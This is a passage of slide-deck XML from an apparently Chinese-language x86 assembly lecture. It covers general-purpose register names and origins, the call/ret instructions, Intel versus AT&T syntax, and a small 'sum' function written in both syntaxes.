                </a:rPr>
                <a:t>edx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3984" y="1872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%ebx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3984" y="2160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%esi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3984" y="2448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%edi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3984" y="2736"/>
              <a:ext cx="1584" cy="2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%esp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3984" y="3024"/>
              <a:ext cx="1584" cy="2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%ebp</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="14" name="Group 21"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4047776" y="1404970"/>
            <a:ext cx="2819400" cy="343694"/>
            <a:chOff x="4495800" y="1404970"/>
            <a:chExt cx="2819400" cy="343694"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 12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16" name="Straight Connector 18"/>
            <p:cNvCxnSpPr>
              <a:stCxn id="15" idx="0"/>
              <a:endCxn id="15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7" name="Group 22"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4047776" y="1989024"/>
            <a:ext cx="2819400" cy="343694"/>
            <a:chOff x="4495800" y="1404970"/>
            <a:chExt cx="2819400" cy="343694"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="18" name="Rectangle 23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19" name="Straight Connector 24"/>
            <p:cNvCxnSpPr>
              <a:stCxn id="18" idx="0"/>
              <a:endCxn id="18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" name="Group 25"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4047776" y="2558580"/>
            <a:ext cx="2819400" cy="343694"/>
            <a:chOff x="4495800" y="1404970"/>
            <a:chExt cx="2819400" cy="343694"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="21" name="Rectangle 26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22" name="Straight Connector 27"/>
            <p:cNvCxnSpPr>
              <a:stCxn id="21" idx="0"/>
              <a:endCxn id="21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3" name="Group 28"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4047776" y="3141484"/>
            <a:ext cx="2819400" cy="343694"/>
            <a:chOff x="4495800" y="1404970"/>
            <a:chExt cx="2819400" cy="343694"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="24" name="Rectangle 29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25" name="Straight Connector 30"/>
            <p:cNvCxnSpPr>
              <a:stCxn id="24" idx="0"/>
              <a:endCxn id="24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6" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4047776" y="3717666"/>
            <a:ext cx="2819400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7" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4047776" y="4301720"/>
            <a:ext cx="2819400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8" name="Rectangle 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4047776" y="4871276"/>
            <a:ext cx="2819400" cy="342900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9" name="Rectangle 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4047776" y="5454180"/>
            <a:ext cx="2819400" cy="342900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0" name="TextBox 52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344485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%ax</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344485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cx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2" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344485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dx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3" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344485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bx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4" name="TextBox 56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3444850" y="370801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si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5" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3444850" y="42872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di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6" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3444850" y="485769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%sp</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3444850" y="544357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bp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8" name="TextBox 60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="443545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%ah</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="443545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ch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0" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="443545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%dh</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 63"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="443545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bh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2" name="TextBox 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="580705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%al</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="580705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cl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4" name="TextBox 70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="580705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%dl</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="TextBox 71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="580705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bl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6" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="5315433" y="4671257"/>
            <a:ext cx="279400" cy="2824085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" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4543186" y="6172200"/>
            <a:ext cx="1835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>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>16</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>位虚拟寄存器</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0">
              <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>向下兼容</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="10800000">
            <a:off x="777850" y="1333500"/>
            <a:ext cx="279400" cy="337631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9" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="-180101" y="2812536"/>
            <a:ext cx="1370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 smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>通用寄存器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50" name="TextBox 76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7118199" y="1391622"/>
            <a:ext cx="1666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累加</a:t>
            </a:r>
            <a:r>
              <a:rPr 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accumulate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7118199" y="1975438"/>
            <a:ext cx="1343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计数</a:t>
            </a:r>
            <a:r>
              <a:rPr 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counter</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7118199" y="2541296"/>
            <a:ext cx="1020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数据</a:t>
            </a:r>
            <a:r>
              <a:rPr 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data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7118199" y="3131786"/>
            <a:ext cx="1020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基数</a:t>
            </a:r>
            <a:r>
              <a:rPr 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base</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7118199" y="3626836"/>
            <a:ext cx="14151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源索引</a:t>
            </a:r>
            <a:r>
              <a:rPr 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source </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr 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index</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7118199" y="4204648"/>
            <a:ext cx="2133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目标索引</a:t>
            </a:r>
            <a:r>
              <a:rPr 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destination</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" i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index</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7118199" y="4701317"/>
            <a:ext cx="1395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i="1" dirty="0" smtClean="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>栈顶</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0" smtClean="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>stack </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0" smtClean="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>pointer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7118199" y="5313528"/>
            <a:ext cx="1257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i="1" dirty="0" smtClean="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>栈帧</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0" smtClean="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>base</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0" smtClean="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>pointer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7664977" y="6490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dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>名称来源</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800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94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 animBg="1"/>
      <p:bldP spid="47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call/ret - </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>函数调用</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>返</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>回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 smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>这两条指令实现子程序（或者称为过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>程、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>函数）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>的调用及返回。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>call</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>指令首先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令。与其它简单的跳转指令不同，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>call</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>指令保存调用之前的地址信息（当</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>call</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>指令结束后，返回到调用之前的地址）。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>指令实现子程序的返回机制，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>语法</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times-Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>call &lt;label&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Times-Roman"/>
              </a:rPr>
              <a:t>ret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642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Intel &amp; AT&amp;T</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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9021310"/>
              </p:ext>
            </p:extLst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Intel</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
                        <a:t>语法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AT&amp;T</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
                        <a:t>语法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mov</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
                        <a:t>eax</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t>, 8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movl</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t> $8, %</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
                        <a:t>eax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mov</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
                        <a:t>ebx</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t>, 0ffffh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movl</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t> $0xffff, %</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
                        <a:t>ebx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int</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t> 80h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int</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t> $80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mov</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
                        <a:t>eax</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t>, [</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
                        <a:t>ecx</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t>]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movl</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t> (%</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
                        <a:t>ecx</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
                        <a:t>), %</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
                        <a:t>eax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85422" y="4073527"/>
            <a:ext cx="4072467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sum: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   push </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>esp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, [ebp+12]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   add </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, [ebp+8]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   pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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 smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>retn</a:t>
            </a:r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554186" y="4070565"/>
            <a:ext cx="4195763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 smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sum</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>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pushl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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movl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>esp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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movl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> 12(%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
